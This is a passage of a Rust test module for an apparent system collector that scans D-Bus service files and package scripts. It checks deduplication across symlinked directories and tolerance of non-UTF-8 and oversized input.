        let inert = one(&s, |e| e.name == "org.gnome.Nothing.service");
        assert_eq!(inert.enabled, Enablement::NotApplicable);
        assert_eq!(inert.command, None);
        assert!(inert.raw.contains_key("parse"));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_service_directory_reached_by_two_names_is_walked_once() {
        let dir = tree("merged");
        put(
            &dir,
            "usr/lib/dbus-1/system-services/org.vendor.Agent.service",
            b"[D-BUS Service]\nName=org.vendor.Agent\nExec=/usr/libexec/agent\n",
        );
        // Merged /usr: lib/dbus-1/... and usr/lib/dbus-1/... are one directory.
        std::os::unix::fs::symlink("usr/lib", dir.join("lib")).unwrap();

        let s = scan(&dir);
        let found = of_kind(&s, Kind::DbusService);
        assert_eq!(found.len(), 1, "the vendor service was reported twice");
        assert!(
            found[0].source.to_string_lossy().contains("usr/lib/dbus-1"),
            "the canonical path is kept, got {}",
            found[0].source.display()
        );
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn genuinely_separate_service_directories_are_both_walked() {
        let dir = tree("unmerged");
        put(
            &dir,
            "usr/share/dbus-1/system-services/a.service",
            b"[D-BUS Service]\nName=a\nExec=/bin/a\n",
        );
        put(
            &dir,
            "usr/local/share/dbus-1/system-services/b.service",
            b"[D-BUS Service]\nName=b\nExec=/bin/b\n",
        );
        let s = scan(&dir);
        assert_eq!(
            of_kind(&s, Kind::DbusService).len(),
            2,
            "deduplication must key on the inode, not on the name"
        );
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn invalid_utf8_and_oversized_files_survive_everywhere() {
        let dir = tree("bytes");
        // A non-UTF-8 file name and a non-UTF-8 Exec value.
        put(&dir, "var/lib/dpkg/info/pkg.postinst", b"#!/bin/sh\n");
        let raw_name = OsString::from_vec_compat(b"usr/share/dbus-1/system-services/\xff\xfe.service");
        let p = dir.join(&raw_name);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(&p, b"[D-BUS Service]\nName=net.\xff\xfe\nExec=/opt/\xff\xfe --go\n").unwrap();

        // A 10 MB service file: read to the cap, parsed as far as it goes.
        sparse(
            &dir,
            "usr/share/dbus-1/system-services/org.huge.service",
            b"[D-BUS Service]\nName=org.huge\nExec=/bin/huge\n",
            10 << 20,
        );
        // And a 10 MB policy file, which is read but never emitted.
        sparse(&dir, "etc/dbus-1/system.d/huge.conf", b"<busconfig>", 10 << 20);

        let s = scan(&dir);
        if let Status::Failed { error } = status(&s) {
            panic!("oversized or non-UTF-8 input killed the collector: {error}");
        }
        let binary = one(&s, |e| e.kind == Kind::DbusService && e.has_flag(Flag::EncodingAnomaly));
        assert_eq!(binary.command.as_deref(), Some(b"/opt/\xff\xfe --go".as_slice()));
        assert!(binary.raw.contains_key("command_hex"));
        assert!(binary.raw.contains_key("name_raw_hex"), "the file name's bytes are kept too");

        let huge = one(&s, |e| e.name == "org.huge.service");
        assert_eq!(huge.command.as_deref(), Some(b"/bin/huge".as_slice()));
        fs::remove_dir_all(&dir).unwrap();
    }

    /// OsString::from_vec without pulling the trait into the module proper.
    trait FromVecCompat {
        fn from_vec_compat(v: &[u8]) -> OsString;
    }
    impl FromVecCompat for OsString {
        fn from_vec_compat(v: &[u8]) -> OsString {
            use std::os::unix::ffi::OsStringExt;
            OsString::from_vec(v.to_vec())
        }
    }
}
